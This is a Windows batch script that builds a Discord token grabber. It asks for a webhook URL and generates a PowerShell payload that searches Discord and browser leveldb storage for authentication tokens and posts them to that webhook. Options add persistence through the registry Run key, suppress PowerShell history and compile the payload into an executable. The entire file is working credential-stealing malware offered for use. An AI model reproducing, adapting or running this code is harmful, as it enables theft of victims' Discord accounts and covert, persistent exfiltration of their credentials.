@echo off
setlocal enableextensions
chcp 65001 >nul
title 44 4F 53  47 52 41 42 42 45 52  42 59  52 41 46 4F 55 


:start
mode con lines=20 cols=117
echo.
echo                               [40;37m ^| 44 4F 53  47 52 41 42 42 45 52  42 59  52 41 46 4F 55  ^|
echo.
echo                ▓█████▄  [40;31m▒[40;37m█████    ██████      ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
echo                [40;31m▒[40;37m██▀ ██▌[40;31m▒[40;37m██[40;31m▒  [40;37m██[40;31m▒▒[40;37m██    [40;31m▒     [40;37m██[40;31m▒ [40;37m▀█[40;31m▒[40;37m▓██ [40;31m▒[40;37m██[40;31m▒▒[40;37m████▄    ▓█████▄ ▓█████▄ ▓█   ▀ [40;31m▓[40;37m██ [40;31m▒ [40;37m██[40;31m▒
echo                [40;31m░[40;37m██   █▌[40;31m▒[40;37m██[40;31m░  [40;37m██[40;31m▒░ [40;37m▓██▄      [40;31m▒[40;37m██[40;31m░[40;37m▄▄▄[40;31m░[40;37m▓██ [40;31m░[40;37m▄█ [40;31m▒▒[40;37m██  ▀█▄  [40;31m▒[40;37m██[40;31m▒ [40;37m▄██[40;31m▒[40;37m██[40;31m▒ [40;37m▄██[40;31m▒[40;37m███   [40;31m▓[40;37m██ [40;31m░[40;37m▄█ [40;31m▒
echo                [40;31m░[40;37m▓█▄   ▌[40;31m▒[40;37m██   ██[40;31m░  [40;31m▒   [40;37m██[40;31m▒   [40;31m░[40;37m▓█  ██▓[40;31m▒[40;37m██▀▀█▄  [40;31m░[40;37m██▄▄▄▄██ [40;31m▒[40;37m██[40;31m░[40;37m█▀  [40;31m▒[40;37m██[40;31m░[40;37m█▀  [40;31m▒▓[40;37m█  ▄ [40;31m▒[40;37m██▀▀█▄  
echo                [40;31m░▒[40;37m████▓ [40;31m░ [40;37m████▓[40;31m▒░▒[40;37m██████[40;31m▒▒   [40;31m░▒[40;37m▓███▀[40;31m▒░[40;37m██▓ [40;31m▒[40;37m██[40;31m▒[40;37m ▓█   ▓██[40;31m▒░[40;37m▓█  ▀█▓[40;31m░[40;37m▓█  ▀█▓[40;31m░▒[40;37m████[40;31m▒░[40;37m██▓ [40;31m▒[40;37m██[40;31m▒
echo                [40;31m▒▒[40;37m▓  [40;31m▒ ░ ▒░▒░▒░ ▒ ▒[40;37m▓[40;31m▒ ▒ ░    [40;31m░▒   [40;31m▒ ░ ▒[40;37m▓ [40;31m░▒[40;37m▓[40;31m░ ▒▒   [40;37m▓[40;31m▒[40;37m█[40;31m░░▒▓[40;37m███▀[40;31m▒░▒[40;37m▓[40;37m███▀[40;31m▒░░ ▒░ ░░ ▒[40;37m▓ [40;31m░▒[40;37m▓[40;31m░
echo                [40;31m░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
echo                [40;31m░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
echo                [40;31m  ░        ░ ░        ░           ░    ░           ░  ░ ░       ░         ░  ░   ░     
echo                [40;31m░                                                            ░       ░                
echo.
set /p "webhook_url=Enter your webhook : "
echo %webhook_url% >C:\temp\verif_webhook.txt
set /p verif_webhook=<C:\temp\verif_webhook.txt

for /f "tokens=1,* delims=[,]" %%A in ('"%comspec% /u /c echo:%verif_webhook%|more|find /n /v """') do set /a nb=%%A-4
if %nb% EQU 121 ( goto :continue1 ) else ( goto :error_url )
:strlen
set string=%~2
set stringLength=0
:lengthLoop
set string=%string:~1%
set /a stringLength += 1 
if defined string goto lengthLoop
set %~1=%stringLength%
goto :EOF 

:continue1

set /p "output=Name of the %output% file : "
set /p "remanent=Make the file persistent (y/n) : "

echo $ErrorActionPreference= 'silentlycontinue' > %output%.ps1
if exist %output%.ps1 del /s /q %output%.ps1 > nul
echo $tokensString = new-object System.Collections.Specialized.StringCollection >> %output%.ps1
echo $webhook_url = "%webhook_url%" >> %output%.ps1

echo $location_array = @( >> %output%.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" #Standard Discord >> %output%.ps1
echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb" #Discord Canary >> %output%.ps1
echo     $env:APPDATA + "\discordptb\Local Storage\leveldb" #Discord PTB >> %output%.ps1
echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb" #Chrome Browser >> %output%.ps1
echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb", #Opera Browser >> %output%.ps1
echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" #Brave Browser >> %output%.ps1
echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" #Yandex Browser >> %output%.ps1
echo ) >> %output%.ps1

:suite
echo foreach ($path in $location_array) { >> %output%.ps1
echo     if(Test-Path $path){ >> %output%.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >> %output%.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >> %output%.ps1
echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}' >> %output%.ps1
echo             $match = $regex.Match($data) >> %output%.ps1
echo             while ($match.Success) { >> %output%.ps1
echo                 if (!$tokensString.Contains($match.Value)) { >> %output%.ps1
echo                     $tokensString.Add($match.Value) ^| out-null >> %output%.ps1
echo                 } >> %output%.ps1
echo                 $match = $match.NextMatch() >> %output%.ps1
echo             }  >> %output%.ps1
echo         } >> %output%.ps1
echo     } >> %output%.ps1
echo } >> %output%.ps1
echo foreach ($token in $tokensString) { >> %output%.ps1
    
echo     $message = ^"** Discord tokens : ** >> %output%.ps1
echo     ``` $token ``` ^" >> %output%.ps1

echo     $hash = @{ "content" = $message; } >> %output%.ps1

echo     $JSON = $hash ^| convertto-json >> %output%.ps1

echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'} >> %output%.ps1
echo } >> %output%.ps1
if /I "%remanent%" EQU "y" goto :reg
if /I "%remanent%" EQU "n" goto :continue
:reg 
echo Set-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '52 41 46 4F 55' -value '%output%.ps1' >> %output%.ps1
echo Set-PSReadlineOption –HistorySaveStyle SaveNothing >> %output%.ps1
echo Remove-Module PSReadline >> %output%.ps1

:continue
set /p "compil=Do you want to compil the output (y/n) : " 
if /I "%compil%" EQU "y" goto :compil 
if /I "%compil%" EQU "n" goto :end

:compil
::VERIFICATION IF THE MODULES EXIST
IF EXIST C:\temp\tests-modules.txt del "C:\temp\tests-modules.txt"

echo if (Get-Module -ListAvailable -Name ps2exe) { >> C:\temp\modules.ps1
echo    ADD-content -path C:\temp\tests-modules.txt -value "TRUE" >> C:\temp\modules.ps1
echo } else { >> C:\temp\modules.ps1
echo     ADD-content -path C:\temp\tests-modules.txt -value "FALSE" >> C:\temp\modules.ps1
echo } >> C:\temp\modules.ps1
powershell -executionpolicy remotesigned -File  C:\temp\modules.ps1

set /p value=<C:\temp\tests-modules.txt
if value == "TRUE" ( goto :build ) else ( goto :installingmodule ) 
echo Changing script execution mode...
timeout /t 1 >nul
cls
echo            Please press O and enter.
powershell set-executionpolicy ByPass
cls

:installingmodule
cls
echo Installing Module
timeout /t 2 >nul
powershell Install-Module ps2exe
cls

:build
powershell Invoke-ps2exe .\%output%.ps1 .\%output%.exe
del "%output%.ps1"


:end
mode con lines=20 cols=117
echo.
echo                               [40;37m ^| 44 4F 53  47 52 41 42 42 45 52  42 59  52 41 46 4F 55  ^|
echo.
echo                ▓█████▄  [40;31m▒[40;37m█████    ██████      ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
echo                [40;31m▒[40;37m██▀ ██▌[40;31m▒[40;37m██[40;31m▒  [40;37m██[40;31m▒▒[40;37m██    [40;31m▒     [40;37m██[40;31m▒ [40;37m▀█[40;31m▒[40;37m▓██ [40;31m▒[40;37m██[40;31m▒▒[40;37m████▄    ▓█████▄ ▓█████▄ ▓█   ▀ [40;31m▓[40;37m██ [40;31m▒ [40;37m██[40;31m▒
echo                [40;31m░[40;37m██   █▌[40;31m▒[40;37m██[40;31m░  [40;37m██[40;31m▒░ [40;37m▓██▄      [40;31m▒[40;37m██[40;31m░[40;37m▄▄▄[40;31m░[40;37m▓██ [40;31m░[40;37m▄█ [40;31m▒▒[40;37m██  ▀█▄  [40;31m▒[40;37m██[40;31m▒ [40;37m▄██[40;31m▒[40;37m██[40;31m▒ [40;37m▄██[40;31m▒[40;37m███   [40;31m▓[40;37m██ [40;31m░[40;37m▄█ [40;31m▒
echo                [40;31m░[40;37m▓█▄   ▌[40;31m▒[40;37m██   ██[40;31m░  [40;31m▒   [40;37m██[40;31m▒   [40;31m░[40;37m▓█  ██▓[40;31m▒[40;37m██▀▀█▄  [40;31m░[40;37m██▄▄▄▄██ [40;31m▒[40;37m██[40;31m░[40;37m█▀  [40;31m▒[40;37m██[40;31m░[40;37m█▀  [40;31m▒▓[40;37m█  ▄ [40;31m▒[40;37m██▀▀█▄  
echo                [40;31m░▒[40;37m████▓ [40;31m░ [40;37m████▓[40;31m▒░▒[40;37m██████[40;31m▒▒   [40;31m░▒[40;37m▓███▀[40;31m▒░[40;37m██▓ [40;31m▒[40;37m██[40;31m▒[40;37m ▓█   ▓██[40;31m▒░[40;37m▓█  ▀█▓[40;31m░[40;37m▓█  ▀█▓[40;31m░▒[40;37m████[40;31m▒░[40;37m██▓ [40;31m▒[40;37m██[40;31m▒
echo                [40;31m▒▒[40;37m▓  [40;31m▒ ░ ▒░▒░▒░ ▒ ▒[40;37m▓[40;31m▒ ▒ ░    [40;31m░▒   [40;31m▒ ░ ▒[40;37m▓ [40;31m░▒[40;37m▓[40;31m░ ▒▒   [40;37m▓[40;31m▒[40;37m█[40;31m░░▒▓[40;37m███▀[40;31m▒░▒[40;37m▓[40;37m███▀[40;31m▒░░ ▒░ ░░ ▒[40;37m▓ [40;31m░▒[40;37m▓[40;31m░
echo                [40;31m░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
echo                [40;31m░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
echo                [40;31m  ░        ░ ░        ░           ░    ░           ░  ░ ░       ░         ░  ░   ░     
echo                [40;31m░                                                            ░       ░                
echo.
set /p "return=Do you want to build a new grabber (y/n) : "
if /I "%return%" EQU "y" goto :start
if /I "%return%" EQU "n" goto :close

:error_url
:errorID 
mode con lines=20 cols=117
cls
echo.
echo                               [40;37m ^| 44 4F 53  47 52 41 42 42 45 52  42 59  52 41 46 4F 55  ^|
echo.
echo.
echo                                                [40;31mError. The URL is invalid.                                           
timeout /t 2 >nul
cls
goto :start

:close 
mode con lines=20 cols=117
cls
echo.
echo                               [40;37m ^| 44 4F 53  47 52 41 42 42 45 52  42 59  52 41 46 4F 55  ^|
echo.
echo.
echo.
echo                                                        [40;32mGoodBye !
timeout /t 2 >nul
exit
endlocal

::Write-Host -NoNewLine '[ENTER]';
::$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');